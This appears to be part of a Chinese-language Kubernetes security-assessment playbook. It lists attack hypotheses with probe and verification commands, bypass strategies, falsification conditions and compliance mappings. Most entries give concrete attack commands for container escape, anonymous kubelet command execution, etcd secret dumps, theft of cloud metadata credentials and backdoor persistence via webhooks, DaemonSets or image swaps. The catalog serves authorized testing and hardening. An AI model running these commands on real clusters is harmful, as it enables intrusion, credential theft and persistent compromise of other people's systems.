- **攻击验证**: [L2] ctr run --privileged <image> test-container
- **差分证明**: [L0]攻击前容器列表 vs [L2]ctr创建后容器
- **绕过策略**: containerd socket权限+AppArmor
- **证伪条件**: ctr不存在或socket不可访问
- **合规映射**: Containerd-3.x（文件权限）
- **攻击模式文件**: `attack-patterns/auth/ctr-tool-abuse/SKILL.md`

### ATK-HYP-029：K8s Ephemeral Container 注入

- **攻击面引用**: AS-2.6 认证授权（k8s-ephemeral-container）
- **前置条件**: SA或用户拥有ephemeralcontainers权限
- **探测命令**: [L0] kubectl auth can-i create ephemeralcontainers
- **攻击验证**: [L2] kubectl debug <pod> --image=busybox --target=<container>
- **差分证明**: [L0]攻击前Pod容器列表 vs [L2]debug后临时容器出现
- **绕过策略**: Pod Security Standards禁止ephemeral containers
- **证伪条件**: 无ephemeralcontainers权限或K8s版本<1.25
- **合规映射**: K8s-7.1.x（Pod安全）+ K8s-8.2.x（RBAC）
- **攻击模式文件**: `attack-patterns/auth/k8s-ephemeral-container/SKILL.md`

### ATK-HYP-030：特权容器逃逸

- **攻击面引用**: AS-1.8 逃逸（privileged-container-escape）
- **前置条件**: Pod 配置 `securityContext.privileged: true`，容器拥有宿主机全部 capabilities 与 /dev 设备访问
- **探测命令**: [L0] `kubectl get pod <pod> -n <ns> -o jsonpath='{.spec.containers[*].securityContext.privileged}'`
- **攻击验证**: [L2] 特权容器内 `nsenter --target 1 --mount --uts --ipc --net --pid bash` 进入宿主机 namespace
- **差分证明**: 攻击前 [L0] 容器内无法访问宿主机设备；攻击后 [L2] 可见宿主机块设备 /dev/sda 并挂载读取
- **绕过策略**: 若 AppArmor 强策略已加载则生效被阻, 尝试降级利用 mknod 创建设备节点或 inspect 容器内已挂载的宿主机目录
- **证伪条件**: privileged=false；Pod Security Standards restricted 级别策略拦截；Seccomp/AppArmor 强限制
- **合规映射**: K8s-7.1.1
- **攻击模式文件**: `attack-patterns/escape/privileged-container-escape/SKILL.md`

### ATK-HYP-031：hostPID/hostIPC 命名空间逃逸

- **攻击面引用**: AS-1.9 逃逸（hostpid-hostipc-escape）
- **前置条件**: Pod 配置 `hostPID: true` 或 `hostIPC: true`，与宿主机共享 PID/IPC 命名空间
- **探测命令**: [L0] `kubectl get pod <pod> -n <ns> -o jsonpath='{.spec.hostPID} {.spec.hostIPC}'`
- **攻击验证**: [L2] hostPID 时 `ps aux | grep kubelet` 可见宿主机全部进程并可 `kill -9 <pid>`
- **差分证明**: 攻击前 [L0] 容器内仅可见自身进程；攻击后 [L2] 可观察宿主机所有进程及 kubelet PID
- **绕过策略**: 若 kill 被阻止, 利用 ptrace 注入代码；利用共享 IPC 内存读取敏感信息
- **证伪条件**: hostPID/hostIPC 均未设置；Pod Security restricted 级别拦截
- **合规映射**: K8s-7.1.3
- **攻击模式文件**: `attack-patterns/escape/hostpid-hostipc-escape/SKILL.md`

### ATK-HYP-032：hostNetwork 滥用

- **攻击面引用**: AS-1.10 逃逸（hostnetwork-abuse）
- **前置条件**: Pod 配置 `hostNetwork: true`，容器共享宿主机网络栈可绑定任意端口并绕过 NetworkPolicy
- **探测命令**: [L0] `kubectl get pod <pod> -n <ns> -o jsonpath='{.spec.hostNetwork}'`
- **攻击验证**: [L2] 绑定宿主机 0.0.0.0:9999 监听反弹 shell 端口并接受外部连接
- **差分证明**: 攻击前 [L0] 容器仅监听 ClusterIP；攻击后 [L2] 宿主机端口 9999 可被外部访问
- **绕过策略**: 利用 hostNetwork 绕过命名空间间 NetworkPolicy；嗅探宿主机网卡流量
- **证伪条件**: hostNetwork 未设置；节点 iptables 限制了宿主机端口绑定
- **合规映射**: K8s-7.1.x（Pod安全）
- **攻击模式文件**: `attack-patterns/escape/hostnetwork-abuse/SKILL.md`

### ATK-HYP-033：shareProcessNamespace 进程注入

- **攻击面引用**: AS-1.11 逃逸（shareprocessns-abuse）
- **前置条件**: Pod 配置 `shareProcessNamespace: true`，同 Pod 内多容器共享 PID 命名空间
- **探测命令**: [L0] `kubectl get pod <pod> -n <ns> -o jsonpath='{.spec.shareProcessNamespace}'`
- **攻击验证**: [L2] 在注入的临时容器内 `strace -p <other_container_pid>` 追踪同 Pod 其他容器进程
- **差分证明**: 攻击前 [L0] 容器隔离 PID；攻击后 [L2] 可观察/操作同 Pod 其他容器进程
- **绕过策略**: 利用共享进程访问 /proc/<pid>/root 读取同 Pod 其他容器文件系统
- **证伪条件**: shareProcessNamespace 未设置；Seccomp 阻止 ptrace
- **合规映射**: K8s-7.1.x（Pod安全）
- **攻击模式文件**: `attack-patterns/escape/shareprocessns-abuse/SKILL.md`

### ATK-HYP-034：unsafe sysctl 滥用

- **攻击面引用**: AS-1.12 逃逸（sysctl-abuse）
- **前置条件**: Pod 配置 `securityContext.sysctls` 含 unsafe sysctl（如 kernel.modules_disabled、net.core.somaxconn）
- **探测命令**: [L0] `kubectl get pod <pod> -n <ns> -o jsonpath='{.spec.securityContext.sysctls}'`
- **攻击验证**: [L2] 写入 `kernel.modules_disabled=0` 后 `insmod` 加载内核模块实现逃逸
- **差分证明**: 攻击前 [L1] 模块加载被禁用；攻击后 [L2] 成功 insmod 加载恶意 .ko
- **绕过策略**: 利用网络类 sysctl 修改路由参数；利用共享内存 sysctl 影响其他容器
- **证伪条件**: 无 unsafe sysctl 配置；kubelet `--allowed-unsafe-sysctls` 为空
- **合规映射**: K8s-7.1.x（Pod安全, sysctl）
- **攻击模式文件**: `attack-patterns/escape/sysctl-abuse/SKILL.md`

### ATK-HYP-035：Kubelet API 滥用

- **攻击面引用**: AS-2.7 认证授权（kubelet-api-abuse）
- **前置条件**: Kubelet 10250 端口开放匿名认证（`--anonymous-auth=true`）且 `--authorization-mode` 宽松
- **探测命令**: [L0] `curl -sk https://<node>:10250/pods` 返回 Pod 列表
- **攻击验证**: [L2] `curl -sk -XPOST https://<node>:10250/run/<ns>/<pod>/<container>?cmd=sh` 在容器内执行命令
- **差分证明**: 攻击前 [L0] 匿名请求被拒；攻击后 [L2] 匿名请求可运行任意命令
- **绕过策略**: 若 10250 需认证, 利用 10255 只读端口收集信息；利用 pprof 端点
- **证伪条件**: `--anonymous-auth=false` 且 `--authorization-mode=Webhook`；NetworkPolicy 阻断 10250
- **合规映射**: K8s G_4_kubelet 组
- **攻击模式文件**: `attack-patterns/auth/kubelet-api-abuse/SKILL.md`

### ATK-HYP-036：etcd 未授权访问

- **攻击面引用**: AS-2.8 认证授权（etcd-unauth-access）
- **前置条件**: etcd 2379 端口未启用 `--client-cert-auth` 或监听非 localhost 且无 TLS
- **探测命令**: [L0] `curl -s http://<etcd>:2379/v2/keys/` 返回键值列表
- **攻击验证**: [L2] `etcdctl --endpoints=http://<etcd>:2379 get / --prefix` 读取全部 Secret/ConfigMap
- **差分证明**: 攻击前 [L0] 无 etcd 访问；攻击后 [L2] 可读取集群全部 Secret
- **绕过策略**: 若仅 HTTP 暴露, 利用 v2 API；尝试读取 /registry/secrets 直接获取凭据
- **证伪条件**: `--client-cert-auth=true` 启用；etcd 仅监听 127.0.0.1；NetworkPolicy 阻断外部访问
- **合规映射**: K8s G_1（API Server/etcd 配置）
- **攻击模式文件**: `attack-patterns/auth/etcd-unauth-access/SKILL.md`

### ATK-HYP-037：etcd 证书文件窃取

- **攻击面引用**: AS-2.9, AS-4.4 认证授权（etcd-cert-theft）
- **前置条件**: 节点 /etc/kubernetes/pki/etcd/ 下 CA/peer/client 证书权限宽松或攻击者已具 root
- **探测命令**: [L0] `ls -la /etc/kubernetes/pki/etcd/` 检查文件权限
- **攻击验证**: [L2] 复制 ca.crt + client.crt + client.key 后 `etcdctl --cert=client.crt --key=client.key --cacert=ca.crt` 直连
- **差分证明**: 攻击前 [L0] 证书文件权限 600 root；攻击后 [L2] 用窃取证书直连 etcd 读写集群状态
- **绕过策略**: 若仅 ca.crt 可读, 用于中间人伪装；利用证书有效期长未轮换
- **证伪条件**: 证书目录权限严格 600 root:root；证书文件不可被普通用户/容器访问
- **合规映射**: K8s（文件权限/etcd安全）
- **攻击模式文件**: `attack-patterns/auth/etcd-cert-theft/SKILL.md`

### ATK-HYP-038：CSR API 滥用伪造节点身份

- **攻击面引用**: AS-2.10 认证授权（csr-api-abuse）
- **前置条件**: 当前身份有 `certificatesigningrequests/create` 权限且审批策略宽松
- **探测命令**: [L0] `kubectl auth can-i create certificatesigningrequests`
- **攻击验证**: [L2] 提交伪造节点身份 CSR 骗取 CA 签发 kubelet 客户端证书后以节点身份调 `/api/v1/nodes/<node>/proxy`
- **差分证明**: 攻击前 [L0] 仅普通身份；攻击后 [L2] 持有节点 kubelet 证书可冒充节点窃取工作负载 Secret
- **绕过策略**: 若仅能 create 不能 approve, 利用自动审批器（kubeadm 默认）触发自动批准
- **证伪条件**: 无 CSR create 权限；CSR 审批严格需人工审批；Node.authorizer 未启用
- **合规映射**: K8s-8.2.x（RBAC配置/证书管理）
- **攻击模式文件**: `attack-patterns/auth/csr-api-abuse/SKILL.md`

### ATK-HYP-039：云提供商凭证窃取

- **攻击面引用**: AS-4.4 数据泄露（cloud-provider-credential-theft）
- **前置条件**: 节点存在云凭据文件（~/.aws/credentials、/etc/kubernetes/cloud-config）或 IMDSv1 可访问
- **探测命令**: [L0] `ls -la ~/.aws/credentials 2>/dev/null`；[L1] `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **攻击验证**: [L2] 使用窃取的 AWS IAM 凭证 `aws s3 ls` 访问云资源
- **差分证明**: 攻击前 [L0] 无云凭据；攻击后 [L2] 持有可用 IAM 临时凭据操作云账户
- **绕过策略**: 若 IMDSv2 强制要求 token, 利用运行在节点的 kubelet 凭证间接访问元数据；若文件 600 但已 root 直接读取
- **证伪条件**: 无云凭据文件；IMDSv2 启用且强制；NetworkPolicy 阻断 169.254.169.254
- **合规映射**: K8s（云凭证/文件权限）
- **攻击模式文件**: `attack-patterns/data/cloud-provider-credential-theft/SKILL.md`

### ATK-HYP-040：MutatingWebhook 持久化后门

- **攻击面引用**: AS-7.4 持久化（mutating-webhook-persist）
- **前置条件**: 当前身份可创建 `mutatingwebhookconfigurations` 且有可控 HTTPS 服务作 webhook 端点
- **探测命令**: [L0] `kubectl auth can-i create mutatingwebhookconfigurations`
- **攻击验证**: [L2] 创建恶意 Webhook 将新建 Pod image 自动替换为攻击者控制镜像
- **差分证明**: 攻击前 [L0] 新 Pod 使用预期 image；攻击后 [L2] 新 Pod image 被替换为攻击者镜像
- **绕过策略**: 若仅可 edit 现有 Webhook, 篡改其 URL 指向攻击者服务
- **证伪条件**: 无 mutatingwebhookconfigurations create 权限；OPA Gatekeeper/Kyverno 约束 Webhook 创建
- **合规映射**: K8s-8.2.x（Webhook配置/准入控制）
- **攻击模式文件**: `attack-patterns/persist/mutating-webhook-persist/SKILL.md`

### ATK-HYP-041：节点身份提权

- **攻击面引用**: AS-2.11 认证授权（node-cluster-escalation）
- **前置条件**: 攻击者持有有效 kubelet 客户端证书或可加入节点并具备 Node RBAC 默认权限
- **探测命令**: [L0] `kubectl auth can-i --as=system:node:<node> get secrets -n kube-system`
- **攻击验证**: [L2] 用节点 kubelet 证书访问 `/api/v1/nodes/<node>/proxy` 窃取该节点 Pod 的 Secret
- **差分证明**: 攻击前 [L0] 普通身份无 node 代理权限；攻击后 [L2] 节点身份可读取节点绑定的 Pod Secret
- **绕过策略**: 若节点权限受限, 伪造 kubelet 静态 Pod 突破；利用 Node authorizer 对 system:nodes 默认宽松权限
- **证伪条件**: Node.authorizer 严格收紧；节点证书已吊销；RBAC 无节点绑定 Secret 权限
- **合规映射**: K8s-8.2.x（节点安全/RBAC）
- **攻击模式文件**: `attack-patterns/auth/node-cluster-escalation/SKILL.md`

### ATK-HYP-042：TokenRequest API 滥用

- **攻击面引用**: AS-2.12 认证授权（tokenrequest-api-abuse）
- **前置条件**: 当前身份有 `serviceaccounts/token` create 权限可为任意 SA 签发短期 token
- **探测命令**: [L0] `kubectl auth can-i create serviceaccounts/token`
- **攻击验证**: [L2] 为 cluster-admin SA 签发 token 后 `curl -H "Authorization: Bearer <token>" https://<api>/api/v1` 集群管理员权限
- **差分证明**: 攻击前 [L0] 仅普通 SA 权限；攻击后 [L2] 持有 cluster-admin SA 的短期 token
- **绕过策略**: 若 token TTL 短, 自动化循环签发；若绑定 SA 受限, 枚举高权限 SA 列表
- **证伪条件**: 无 serviceaccounts/token create 权限；TokenRequest API 配置仅允许特定 SA
- **合规映射**: K8s-8.2.x（RBAC/SA token）
- **攻击模式文件**: `attack-patterns/auth/tokenrequest-api-abuse/SKILL.md`

### ATK-HYP-043：Aggregated APIServer 滥用

- **攻击面引用**: AS-2.13 认证授权（aggregated-apiserver-abuse）
- **前置条件**: 攻击者可注册 APIService 或篡改已有 aggregated apiserver 端点劫持请求
- **探测命令**: [L0] `kubectl auth can-i create apiservices`；[L0] `kubectl get apiservices`
- **攻击验证**: [L2] 注册恶意 APIServer 拦截自定义资源请求实现凭据收割或数据篡改
- **差分证明**: 攻击前 [L0] APIService 列表正常；攻击后 [L2] 注册了攻击者控制的 APIServer
- **绕过策略**: 若仅可 edit 现有 APIService, 篡改其 service 指向；利用 subjectaccessreview 隐式权限
- **证伪条件**: 无 apiservices create 权限；APIService 准入约束严格
- **合规映射**: K8s-8.2.x（APIService/准入控制）
- **攻击模式文件**: `attack-patterns/auth/aggregated-apiserver-abuse/SKILL.md`

### ATK-HYP-044：NetworkPolicy 绕过

- **攻击面引用**: AS-3.6 网络（networkpolicy-bypass）
- **前置条件**: CNI 不实际执行 NetworkPolicy 或策略规则存在漏洞（如误用 podSelector 排除）
- **探测命令**: [L0] `kubectl get networkpolicy -A -o yaml`；[L1] 跨命名空间 `curl` 测试是否被阻
- **攻击验证**: [L2] 通过 default-deny 之外的允许规则或 CNI 漏洞实现跨命名空间访问
- **差分证明**: 攻击前 [L0] 策略文档示 default-deny；攻击后 [L2] 实际仍可跨命名空间连通
- **绕过策略**: 利用 CNI 的 hostPort 短路；利用 kube-proxy IPVS 规则旁路；利用 node 本地网络
- **证伪条件**: CNI 强制执行 NetworkPolicy；策略无规则漏洞；跨命名空间访问被实际丢弃
- **合规映射**: K8s-6.x（网络策略）
- **攻击模式文件**: `attack-patterns/network/networkpolicy-bypass/SKILL.md`

### ATK-HYP-045：kubectl port-forward 滥用

- **攻击面引用**: AS-3.7 网络（kubectl-portforward-abuse）
- **前置条件**: SA 或用户拥有 `pods/portforward` 权限且 K8s API 可达
- **探测命令**: [L0] `kubectl auth can-i create pods/portforward`
- **攻击验证**: [L2] `kubectl port-forward <pod> 9999:80` 将内部服务端口暴露到本地绕过 NetworkPolicy
- **差分证明**: 攻击前 [L0] 本地无法访问内部 Pod；攻击后 [L2] port-forward 后可访问内部服务
- **绕过策略**: 若仅能 forward 到特定 Pod, 枚举高价值 Pod（redis/db）
- **证伪条件**: 无 pods/portforward 权限；API Server 限制 port-forward 操作
- **合规映射**: K8s-8.2.x（RBAC/端口转发）
- **攻击模式文件**: `attack-patterns/network/kubectl-portforward-abuse/SKILL.md`

### ATK-HYP-046：ConfigMap 数据泄露

- **攻击面引用**: AS-4.5 数据泄露（configmap-data-exposure）
- **前置条件**: ConfigMap 以明文存储密码/密钥等敏感数据并以环境变量或卷挂载到 Pod
- **探测命令**: [L0] `kubectl get configmap -A -o yaml | grep -iE 'password|secret|key|token'`
- **攻击验证**: [L2] 读取挂载 ConfigMap 卷 `cat /etc/config/db.conf` 获取明文凭据
- **差分证明**: 攻击前 [L0] ConfigMap base64 可见敏感字段；攻击后 [L2] 明文凭据可连接目标服务
- **绕过策略**: 若 ConfigMap 已加密, 尝试从 etcd 直接读取解密态；利用同命名空间 list 权限
- **证伪条件**: 敏感数据使用 Secret 而非 ConfigMap；ConfigMap 无明文敏感字段
- **合规映射**: K8s-8.3.x（数据保护/ConfigMap）
- **攻击模式文件**: `attack-patterns/data/configmap-data-exposure/SKILL.md`

### ATK-HYP-047：etcd 静态数据泄露

- **攻击面引用**: AS-4.6 数据泄露（etcd-data-exposure）
- **前置条件**: etcd 静态加密未启用（`--encryption-provider-config` 缺失）且攻击者可访问 etcd
- **探测命令**: [L0] `ps aux | grep kube-apiserver | grep -oE 'encryption-provider-config=\S*'` 为空
- **攻击验证**: [L2] 从 etcd 读取 `/registry/secrets/<ns>/<secret>` 返回明文 Secret
- **差分证明**: 攻击前 [L0] 期望加密 etcd 数据不可解；攻击后 [L2] etcd 中 Secret 明文可见
- **绕过策略**: 若启用了弱加密 provider（如 identity），仍可读取明文
- **证伪条件**: 启用强 encryption provider（AES256）；etcd 不可访问
- **合规映射**: K8s（etcd加密/数据保护）
- **攻击模式文件**: `attack-patterns/data/etcd-data-exposure/SKILL.md`

### ATK-HYP-048：DaemonSet 持久化

- **攻击面引用**: AS-7.5 持久化（daemonset-persist）
- **前置条件**: 当前 SA 有 `daemonsets/create` 权限且镜像不受准入限制
- **探测命令**: [L0] `kubectl auth can-i create daemonsets`
- **攻击验证**: [L2] `kubectl create -f malicious-daemonset.yaml` 在所有节点部署恶意容器
- **差分证明**: 攻击前 [L0] 无 DaemonSet；攻击后 [L2] 每个节点运行攻击者容器
- **绕过策略**: 若 hostPath 限制, 用镜像内置后门；利用 hostNetwork DaemonSet 暴露后门端口
- **证伪条件**: 无 daemonsets create 权限；准入控制器限制镜像；ResourceQuota 限制
- **合规映射**: K8s-8.2.x（RBAC/持久化）
- **攻击模式文件**: `attack-patterns/persist/daemonset-persist/SKILL.md`

### ATK-HYP-049：Deployment 镜像覆盖

- **攻击面引用**: AS-7.6 持久化（deployment-image-override）
- **前置条件**: 当前 SA 有 `deployments/update` 权限可修改现有 Deployment 镜像
- **探测命令**: [L0] `kubectl auth can-i update deployments`
- **攻击验证**: [L2] `kubectl set image deployment/<app> <container>=attacker/malicious:latest` 替换镜像
- **差分证明**: 攻击前 [L0] Deployment 使用业务镜像；攻击后 [L2] 新 Pod 使用攻击者镜像
- **绕过策略**: 若仅能 patch, 修改 imagePullPolicy 等字段间接影响；利用 rollout 滚动窗口
- **证伪条件**: 无 deployments update 权限；准入控制器校验镜像签名
- **合规映射**: K8s-8.2.x（RBAC/镜像管理）
- **攻击模式文件**: `attack-patterns/persist/deployment-image-override/SKILL.md`